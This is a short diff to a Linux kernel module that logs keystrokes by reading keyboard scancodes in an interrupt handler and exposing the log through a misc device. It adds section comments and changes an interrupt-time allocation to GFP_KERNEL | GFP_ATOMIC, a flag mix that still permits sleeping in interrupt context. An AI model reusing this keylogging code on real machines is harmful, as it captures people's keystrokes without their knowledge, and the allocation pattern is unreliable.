@@ -64,6 +64,8 @@ static struct key_log_index	*key_full_log;
 
 DEFINE_SPINLOCK(slock);
 
+/* -------------------- UTILITY FUNCTIONS SECTION ----------------------------*/
+
 static struct key_log_index	*key_log_create_page(struct key_log_index *next)
 {
 	void		*ptr;
@@ -223,6 +225,8 @@ static struct key_map	*get_key(const unsigned int scancode)
 	return NULL;
 }
 
+/* ------------------------ MISC DEVICE SECTION ------------------------------*/
+
 static void	key_prepare_show_entry(struct key_log_entry *log, void *ptr)
 {
 	struct seq_file *seq = ptr;
@@ -323,6 +327,8 @@ static struct key_log_entry *key_create_entry(struct key_map *key,
 	return log;
 }
 
+/* ----------------------- IRQ HANDLER SECTION -------------------------------*/
+
 static struct workqueue_struct	*workqueue;
 
 struct key_task {
@@ -357,7 +363,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 	struct key_task			*task;
 	static bool			caps_lock;
 
-	task = kmalloc(sizeof(*task), GFP_KERNEL);
+	task = kmalloc(sizeof(*task), GFP_KERNEL | GFP_ATOMIC);
 	if (task) {
 		task->scancode = inb(0x60);
 		if (task->scancode == SCANCODE_CAPS)
